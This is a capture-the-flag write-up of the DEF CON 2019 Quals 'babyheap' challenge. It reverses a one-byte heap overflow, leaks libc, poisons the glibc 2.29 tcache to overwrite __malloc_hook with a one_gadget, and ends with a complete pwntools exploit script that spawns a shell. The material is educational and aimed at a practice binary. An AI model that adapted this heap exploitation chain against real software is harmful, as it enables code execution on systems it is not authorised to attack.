### Defcon 2019 Quals Baby Heap

For the record, I was not the one who solved this for my team. However I did work on this challenge afterwards, and here is what I did.

We are given a binary file, and a libc file. Let's take a look at those two things:
```
$	ile babyheap 
babyheap: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=afa4d4d076786b1a690f1a49923d1e054027e8e7, for GNU/Linux 3.2.0, stripped
$	pwn checksec babyheap 
[*] '/Hacker/defcon/babyheap/babyheap'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    FORTIFY:  Enabled
$	./libc.so 
GNU C Library (Ubuntu GLIBC 2.29-0ubuntu2) stable release version 2.29.
Copyright (C) 2019 Free Software Foundation, Inc.
This is free software; see the source for copying conditions.
There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A
PARTICULAR PURPOSE.
Compiled by GNU CC version 8.3.0.
libc ABIs: UNIQUE IFUNC ABSOLUTE
For bug reporting instructions, please see:
<https://bugs.launchpad.net/ubuntu/+source/glibc/+bugs>.
$	./babyheap 
-----Yet Another Babyheap!-----
[M]alloc 
[F]ree 
[S]how 
[E]xit 
------------------------
Command:
> 
```

So we can see that the binary we are given is a `64` bit binary, with all of the standard options. We see that the binary gives us for different options, allocate space, free space, show space, and exit. By running the libc file, we can see that it is libc version `2.29` which is used in Ubuntu `19.04`. 

### Reversing

Looking through the code for this program, it all seems pretty much what we would expect. The main function calls a function at offset `0x151b`, which essentially acts as a looped menu. Looking at the function responsible for allocating new memory at offset `0x1223` we see some interesting things:

```
signed __int64 allocateMemory()
{
  void *v0; // rax@2
  signed int i; // ebp@2
  __int64 size; // r12@6
  __int64 lenCheck; // rbx@10
  __int64 *v4; // rbp@10
  signed __int64 result; // rax@17
  __int64 v6; // rcx@22
  char buf; // [sp+7h] [bp-21h]@10
  __int64 canary; // [sp+8h] [bp-20h]@1

  canary = *MK_FP(__FS__, 40LL);
  if ( ptrArray[0] )
  {
    v0 = &unk_4070;
    for ( i = 1; ; ++i )
    {
      v0 = (char *)v0 + 16;
      if ( !*((_QWORD *)v0 - 2) )
        break;
    }
    if ( (unsigned int)i > 9 )
    {
      result = 4294967293LL;
      goto LABEL_22;
    }
  }
  else
  {
    i = 0;
  }
  __printf_chk(1LL, "Size:\n> ");
  LODWORD(size) = getLong();
  if ( (unsigned int)(size - 1) > 0x177 )
  {
    result = 0xFFFFFFFDLL;
  }
  else
  {
    if ( (unsigned int)size <= 0xF8 )
      ptrArray[2 * (unsigned __int64)(unsigned int)i] = (__int64)malloc(0xF8uLL);
    else
      ptrArray[2 * (unsigned __int64)(unsigned int)i] = (__int64)malloc(0x178uLL);
    if ( ptrArray[2 * (unsigned __int64)(unsigned int)i] )
    {
      LODWORD(ptrArray[2 * (unsigned int)i + 1]) = size;
      __printf_chk(1LL, "Content:\n> ");
      read(0, &buf, 1uLL);
      size = (unsigned int)size;
      lenCheck = 0LL;
      v4 = &ptrArray[2 * (unsigned __int64)(unsigned int)i];
      while ( buf != 10 && buf )
      {
        *(_BYTE *)(*v4 + lenCheck) = buf;
        read(0, &buf, 1uLL);
        if ( size == lenCheck )
        {
          result = 0LL;
          goto LABEL_22;
        }
        ++lenCheck;
      }
      result = 0LL;
    }
    else
    {
      result = 0xFFFFFFFDLL;
    }
  }
LABEL_22:
  v6 = *MK_FP(__FS__, 40LL) ^ canary;
  return result;
}
```

First off we can see that with the `size` check, we can't allocate a chunk bigger than `0x177`. In addition to that, despite what size we pick only one of two sizes will be picked. These sizes are either `0xf8` or `0x178` (if the requested size is greater than `0xf8` we get a `0x178` chunk, otherwise we get a `0xf8` byte chunk). In addition to that we can see a one byte overflow bug, that occurs in the while loop. The loop itself scans in data one byte at a time. It checks for an overflow via after scanning in the byte for an iteration it checks if the iteration counter `lenCheck` is equal to the size (if so, the loop exits). Proceeding that `lenCheck` is incremented, and since it's incremented after the read we get a one byte overflow. Also another thing to note, it saves the size of the chunk in addition to the pointer

Looking at the function responsible for showing us a chunk of memory (at offset `0x143c`) we see that it just takes the heap pointer to the data and passes it to `puts` (after doing a check on to see if the index is valid):
```
signed __int64 sub_143C()
{
  unsigned int index; // eax@1
  const char *ptr; // rdi@2
  signed __int64 result; // rax@3

  __printf_chk(1LL, "(Starting from 0) Index:\n> ");
  index = getLong();
  if ( index > 9 )
  {
    result = 0xFFFFFFFBLL;
  }
  else
  {
    ptr = (const char *)ptrArray[2 * (unsigned __int64)index];
    if ( ptr )
    {
      puts(ptr);
      result = 0LL;
    }
    else
    {
      result = 0xFFFFFFFBLL;
    }
  }
  return result;
}
```

For the function responsible for freeing memory, we can see that it clears out the memory via `memset` before passing it to free. We can also see that it clears out the pointer afterwards, so no stale pointer here:

```
signed __int64 __fastcall sub_13CC(__int64 a1, __int64 a2)
{
  unsigned int index; // eax@1
  signed __int64 sizeIndex; // rdx@2
  void *size; // rdi@2
  __int64 *ptr; // rbx@3
  signed __int64 result; // rax@3

  puts("(Starting from 0) Index:\n> ");
  index = getLong();
  if ( index > 9 )
  {
    result = 4294967292LL;
  }
  else
  {
    sizeIndex = 2LL * index;
    size = (void *)ptrArray[sizeIndex];
    if ( size )
    {
      ptr = &ptrArray[sizeIndex];
      memset(size, 0, LODWORD(ptrArray[sizeIndex + 1]));
      free((void *)*ptr);
      *((_DWORD *)ptr + 2) = 0;
      *ptr = 0LL;
      result = 0LL;
    }
    else
    {
      result = 4294967292LL;
    }
  }
  return result;
}
```

### Exploitation

So our exploit will have two parts, getting a libc infoleak then writing a one gadget to the hook for malloc. One thing about this version of libc, since it's newer it will have the tcache mechanism we will have to deal with. The tcache is a mechanism designed to reuse recently allocated memory chunks by the same thread, in order to improve performance. By default the tcache list will only hold seven entries, which we can see in the `malloc.c` source code from this version of libc:

```
/* This is another arbitrary limit, which tunables can change.  Each
   tcache bin will hold at most this number of chunks.  */
# define TCACHE_FILL_COUNT 7
``` 

Looking at the source code, we see that we can have a total of ten different chunks allocated at one time. So what we can do is allocate ten chunks, then free `7` of them to fill ub the tcache. After that blocks we free will end up in the unsorted bin due to their size, which will have libc pointers to `main_arena` values. We can groom the heap so that when we allocate a new chunk of memory, it overlaps with a chunk that was stored in the unsorted bin and has a libc address in it. Since the function for scanning in data will stop reading on a newline, we can either send just a newline or send an eight byte string (since there are two eight byte libc addresses stored next to each other). Then when we view the data for that allocated chunk, we will get the libc infoleak (so the bug is it didn't clear our heap metadata from memory that we were able to allocate).

Here is a chunk stored in the unsorted bin prior to us allocating it (we can see there are two libc pointers):

```
0x55f427dd6350:	0x0	0x201
0x55f427dd6360:	0x7f1f03cd8ca0	0x7f1f03cd8ca0
```

Then when we allocated a chunk with the string `15935728` we can, the memory looks like this now. Now we can get that libc infoleak by showing this chunk:

```
0x55f427dd6350:	0x0	0x101
0x55f427dd6360:	0x3832373533393531	0x7f1f03cd8ca0
```

Also we can see that the pointer we leak points to a main arena entry.

```
gef➤  x/g 0x7f1f03cd8ca0
0x7f1f03cd8ca0 <main_arena+96>:	0x55f427dd6c50
```

Now to get code execution, we will abuse the tcache mechanism. How the tcache works is it stores recently freed chunks in a linked list, which we can see here. First we see two chunks of size `0xf8`:

```
gef➤  x/64g 0x56396b21a750
0x56396b21a750: 0x3434343434343434  0x101
0x56396b21a760: 0x3535353535353535  0x3535353535353535
0x56396b21a770: 0x3535353535353535  0x3535353535353535
0x56396b21a780: 0x3535353535353535  0x3535353535353535
0x56396b21a790: 0x3535353535353535  0x3535353535353535
0x56396b21a7a0: 0x3535353535353535  0x3535353535353535
0x56396b21a7b0: 0x3535353535353535  0x3535353535353535
0x56396b21a7c0: 0x3535353535353535  0x3535353535353535
0x56396b21a7d0: 0x3535353535353535  0x3535353535353535
0x56396b21a7e0: 0x3535353535353535  0x3535353535353535
0x56396b21a7f0: 0x3535353535353535  0x3535353535353535
0x56396b21a800: 0x3535353535353535  0x3535353535353535
0x56396b21a810: 0x3535353535353535  0x3535353535353535
0x56396b21a820: 0x3535353535353535  0x3535353535353535
0x56396b21a830: 0x3535353535353535  0x3535353535353535
0x56396b21a840: 0x3535353535353535  0x3535353535353535
0x56396b21a850: 0x3535353535353535  0x101
0x56396b21a860: 0x3636363636363636  0x3636363636363636
0x56396b21a870: 0x3636363636363636  0x3636363636363636
0x56396b21a880: 0x3636363636363636  0x3636363636363636
0x56396b21a890: 0x3636363636363636  0x3636363636363636
0x56396b21a8a0: 0x3636363636363636  0x3636363636363636
0x56396b21a8b0: 0x3636363636363636  0x3636363636363636
0x56396b21a8c0: 0x3636363636363636  0x3636363636363636
0x56396b21a8d0: 0x3636363636363636  0x3636363636363636
0x56396b21a8e0: 0x3636363636363636  0x3636363636363636
0x56396b21a8f0: 0x3636363636363636  0x3636363636363636
0x56396b21a900: 0x3636363636363636  0x3636363636363636
0x56396b21a910: 0x3636363636363636  0x3636363636363636
0x56396b21a920: 0x3636363636363636  0x3636363636363636
0x56396b21a930: 0x3636363636363636  0x3636363636363636
0x56396b21a940: 0x3636363636363636  0x3636363636363636
```

Then when we free them, we can see how at the qword of where the data goes, there is a pointer to the next chunk:

```
gef➤  x/64g 0x56396b21a750
0x56396b21a750: 0x0 0x101
0x56396b21a760: 0x56396b21a860  0x56396b21a010
0x56396b21a770: 0x0 0x0
0x56396b21a780: 0x0 0x0
0x56396b21a790: 0x0 0x0
0x56396b21a7a0: 0x0 0x0
0x56396b21a7b0: 0x0 0x0
0x56396b21a7c0: 0x0 0x0
0x56396b21a7d0: 0x0 0x0
0x56396b21a7e0: 0x0 0x0
0x56396b21a7f0: 0x0 0x0
0x56396b21a800: 0x0 0x0
0x56396b21a810: 0x0 0x0
0x56396b21a820: 0x0 0x0
0x56396b21a830: 0x0 0x0
0x56396b21a840: 0x0 0x0
0x56396b21a850: 0x0 0x101
0x56396b21a860: 0x56396b21a960  0x56396b21a010
0x56396b21a870: 0x0 0x0
0x56396b21a880: 0x0 0x0
0x56396b21a890: 0x0 0x0
0x56396b21a8a0: 0x0 0x0
0x56396b21a8b0: 0x0 0x0
0x56396b21a8c0: 0x0 0x0
0x56396b21a8d0: 0x0 0x0
0x56396b21a8e0: 0x0 0x0
0x56396b21a8f0: 0x0 0x0
0x56396b21a900: 0x0 0x0
0x56396b21a910: 0x0 0x0
0x56396b21a920: 0x0 0x0
0x56396b21a930: 0x0 0x0
0x56396b21a940: 0x0 0x0
```

Essentially what our plan is is this. First groom the heap by mallocing / freeing chunks that way we can allocate a chunk before an already allocated chunk. Proceeding we will allocate a chunk before an already existing chunk, and overflow the size with the byte `0x81`, to set the size equl to `0x181`. Thing is with this witht he two chunk sizes we can allocate, the size value is either `0x101` for the `0xf8` chunks, or `0x181` for the `0x178` chunks (there is an extra `0x8` bytes for the heap header):

```
gef➤  x/64g 0x555555559250
0x555555559250: 0x0 0x101
0x555555559260: 0x3832373533393531  0x0
0x555555559270: 0x0 0x0
0x555555559280: 0x0 0x0
0x555555559290: 0x0 0x0
0x5555555592a0: 0x0 0x0
0x5555555592b0: 0x0 0x0
0x5555555592c0: 0x0 0x0
0x5555555592d0: 0x0 0x0
0x5555555592e0: 0x0 0x0
0x5555555592f0: 0x0 0x0
0x555555559300: 0x0 0x0
0x555555559310: 0x0 0x0
0x555555559320: 0x0 0x0
0x555555559330: 0x0 0x0
0x555555559340: 0x0 0x0
0x555555559350: 0x0 0x181
0x555555559360: 0x3832313539333537  0x0
```

Following that we will free the chunk with the overwritten size value `0x181`. Then we will allocate a `0x178` byte chunk which will give us this chunk that we just overflowed. This will allow us to write to this smaller chunk like it is a larger chunk, and overflow a significant portion of the next chunk. Also as part of the heap grooming we would ensure that the next chunk is one stored in the tcache mechanism and has that pointer to the next item in the linked list. We simply overwrite the first pointer (the one to the next object in the linked list) with that of the libc address for malloc hook. Then it's just a matter of allocating chunks untill we get malloc to return a pointer to the malloc hook. Then we can just write a onegadget (https://github.com/david942j/one_gadget) to it, which we can find like this (for which one to use, you can either check to see what conditions are met when the gadget executes or just through trial and error):

```
$ one_gadget libc.so 
0xe237f execve("/bin/sh", rcx, [rbp-0x70])
constraints:
  [rcx] == NULL || rcx == NULL
  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL

0xe2383 execve("/bin/sh", rcx, rdx)
constraints:
  [rcx] == NULL || rcx == NULL
  [rdx] == NULL || rdx == NULL

0xe2386 execve("/bin/sh", rsi, rdx)
constraints:
  [rsi] == NULL || rsi == NULL
  [rdx] == NULL || rdx == NULL

0x106ef8 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
```

Let's take a look at how the memory is corrupted exactly as we do this. First we start out with our chunk which we will overflow (holds `33333333`) followed by a chunk stored in the tcache mechanism with a linked list pointer:

```
gef➤  x/64g 0x55d01d7cc850
0x55d01d7cc850: 0x0 0x101
0x55d01d7cc860: 0x3333333333333333  0x0
0x55d01d7cc870: 0x0 0x0
0x55d01d7cc880: 0x0 0x0
0x55d01d7cc890: 0x0 0x0
0x55d01d7cc8a0: 0x0 0x0
0x55d01d7cc8b0: 0x0 0x0
0x55d01d7cc8c0: 0x0 0x0
0x55d01d7cc8d0: 0x0 0x0
0x55d01d7cc8e0: 0x0 0x0
0x55d01d7cc8f0: 0x0 0x0
0x55d01d7cc900: 0x0 0x0
0x55d01d7cc910: 0x0 0x0
0x55d01d7cc920: 0x0 0x0
0x55d01d7cc930: 0x0 0x0
0x55d01d7cc940: 0x0 0x0
0x55d01d7cc950: 0x0 0x101
0x55d01d7cc960: 0x55d01d7cca60  0x55d01d7cc010
```

Then we will allocate a chunk behind (thanks to a bit of heap grooming) the `33333333` chunk, which will overflow the size value with the byte `0x81`.

```
gef➤  x/64g 0x55d01d7cc790
0x55d01d7cc790: 0x3434343434343434  0x3434343434343434
0x55d01d7cc7a0: 0x3434343434343434  0x3434343434343434
0x55d01d7cc7b0: 0x3434343434343434  0x3434343434343434
0x55d01d7cc7c0: 0x3434343434343434  0x3434343434343434
0x55d01d7cc7d0: 0x3434343434343434  0x3434343434343434
0x55d01d7cc7e0: 0x3434343434343434  0x3434343434343434
0x55d01d7cc7f0: 0x3434343434343434  0x3434343434343434
0x55d01d7cc800: 0x3434343434343434  0x3434343434343434
0x55d01d7cc810: 0x3434343434343434  0x3434343434343434
0x55d01d7cc820: 0x3434343434343434  0x3434343434343434
0x55d01d7cc830: 0x3434343434343434  0x3434343434343434
0x55d01d7cc840: 0x3434343434343434  0x3434343434343434
0x55d01d7cc850: 0x3434343434343434  0x181
0x55d01d7cc860: 0x3333333333333333  0x0
0x55d01d7cc870: 0x0 0x0
0x55d01d7cc880: 0x0 0x0
0x55d01d7cc890: 0x0 0x0
0x55d01d7cc8a0: 0x0 0x0
0x55d01d7cc8b0: 0x0 0x0
0x55d01d7cc8c0: 0x0 0x0
0x55d01d7cc8d0: 0x0 0x0
0x55d01d7cc8e0: 0x0 0x0
0x55d01d7cc8f0: 0x0 0x0
0x55d01d7cc900: 0x0 0x0
0x55d01d7cc910: 0x0 0x0
0x55d01d7cc920: 0x0 0x0
0x55d01d7cc930: 0x0 0x0
0x55d01d7cc940: 0x0 0x0
0x55d01d7cc950: 0x0 0x101
0x55d01d7cc960: 0x55d01d7cca60  0x55d01d7cc010
```

Then we will free the `33333333` chunk, then immediately allocate a new chunk of size `0x174` and use it to overwrite the next pointer in the linked list to the address of the malloc hook:

```
gef➤  x/64g 0x55d01d7cc790
0x55d01d7cc790: 0x3434343434343434  0x3434343434343434
0x55d01d7cc7a0: 0x3434343434343434  0x3434343434343434
0x55d01d7cc7b0: 0x3434343434343434  0x3434343434343434
0x55d01d7cc7c0: 0x3434343434343434  0x3434343434343434
0x55d01d7cc7d0: 0x3434343434343434  0x3434343434343434
0x55d01d7cc7e0: 0x3434343434343434  0x3434343434343434
0x55d01d7cc7f0: 0x3434343434343434  0x3434343434343434
0x55d01d7cc800: 0x3434343434343434  0x3434343434343434
0x55d01d7cc810: 0x3434343434343434  0x3434343434343434
0x55d01d7cc820: 0x3434343434343434  0x3434343434343434
0x55d01d7cc830: 0x3434343434343434  0x3434343434343434
0x55d01d7cc840: 0x3434343434343434  0x3434343434343434
0x55d01d7cc850: 0x3434343434343434  0x181
0x55d01d7cc860: 0x3131313131313131  0x3131313131313131
0x55d01d7cc870: 0x3131313131313131  0x3131313131313131
0x55d01d7cc880: 0x3131313131313131  0x3131313131313131
0x55d01d7cc890: 0x3131313131313131  0x3131313131313131
0x55d01d7cc8a0: 0x3131313131313131  0x3131313131313131
0x55d01d7cc8b0: 0x3131313131313131  0x3131313131313131
0x55d01d7cc8c0: 0x3131313131313131  0x3131313131313131
0x55d01d7cc8d0: 0x3131313131313131  0x3131313131313131
0x55d01d7cc8e0: 0x3131313131313131  0x3131313131313131
0x55d01d7cc8f0: 0x3131313131313131  0x3131313131313131
0x55d01d7cc900: 0x3131313131313131  0x3131313131313131
0x55d01d7cc910: 0x3131313131313131  0x3131313131313131
0x55d01d7cc920: 0x3131313131313131  0x3131313131313131
0x55d01d7cc930: 0x3131313131313131  0x3131313131313131
0x55d01d7cc940: 0x3131313131313131  0x3131313131313131
0x55d01d7cc950: 0x3131313131313131  0x3131313131313131
0x55d01d7cc960: 0x7fea6bc49c30  0x55d01d7cc010
0x55d01d7cc970: 0x0 0x0
0x55d01d7cc980: 0x0 0x0
gef➤  x/g 0x7fea6bc49c30
0x7fea6bc49c30 <__malloc_hook>: 0x0
```

Now that that is done, we can just allocate chunks untill we get malloc to return a pointer to the malloc hook (which due to how we groomed the heap, is only two). Proceeding that we can just get the program to call malloc, and we get a shell.

Putting it all together, we get the following exploit:
```
from pwn import *

#target = process('./babyheap', env={"LD_PRELOAD":"./libc.so"})
target = process('./babyheap')
gdb.attach(target, gdbscript='pie b *0x147b')
libc = ELF('libc.so')

# Helper functions to handle I/O with program
def ri():
  print target.recvuntil('>')

def malloc(content, size, new=0):
  ri()  
  target.sendline('M')
  ri()
  target.sendline(str(size))
  ri()
  if new == 0:
            target.sendline(content)
  else:
      target.send(content)

def free(index):
  ri()
  target.sendline('F')
  ri()
  target.sendline(str(index))
    
def show(index):
  ri()
  target.sendline('S')
  ri()
  target.sendline(str(index))

# Start off by allocating 10 blocks, then free them all.
# Fill up the tcache and get some blocks in the unsorted bin for the leak

for i in xrange(10):
    malloc(str(i)*0xf8, 0xf8)

for i in range(9, -1, -1):
    free(i)


# Allocate blocks untill we get to the one stored in the unsorted bin with the libc address
malloc('', 0xf8)
malloc('', 0xf8)
malloc('', 0xf8)
malloc('', 0xf8)
malloc('', 0xf8)
malloc('', 0xf8)
malloc('', 0xf8)
malloc('', 0xf8)
malloc('15935728', 0xf8) # Libc address here

# Leak the libc address
ri()
target.sendline('S')
ri()
target.sendline('8')
target.recvuntil("15935728")

leak = target.recvline().replace("\x0a", "")
leak = u64(leak + "\x00"*(8 - len(leak)))
libcBase = leak - 0x1e4ca0

print "libc base: " + hex(libcBase)



# Free all allocated blocks, so we can allocate more
for i in range(8, -1, -1):
    free(i)

# Allocate / free blocks in certain order, to groom heap so we can 
# allocate blocks behind already existing blocks

malloc("1"*8, 0x8)
malloc("2"*8, 0x8)

free(0)
free(1)


# This is the chunk whoose size value will be overflowed
malloc('3'*8, 0x8)

# Allocate a chunk to overflow that chunk's size with '0x81'
malloc('4'*0xf8 + "\x81", 0xf8)

# Free the overflowed chunk
free(0)


# Allocate overflowed chunk again, however this time we can write more data to it
# because of the overflowed size value. Overwrite the next pointer in the tcache linked
# list in the next chunk with the address of malloc_hook
malloc('1'*0x100 + p64(libcBase + libc.sym["__malloc_hook"])[:6], 0x174)

# Allocate a block on the chunk, so the next one will be to the malloc hook

malloc("15935728", 0x10)

# Calculate the onegadget address, then send it over
onegadget = libcBase + 0xe2383
malloc(p64(onegadget)[:6], 0x10)

# Get the program to call malloc, and get a shell
target.sendline('M')
target.sendline("10")

target.interactive()
```

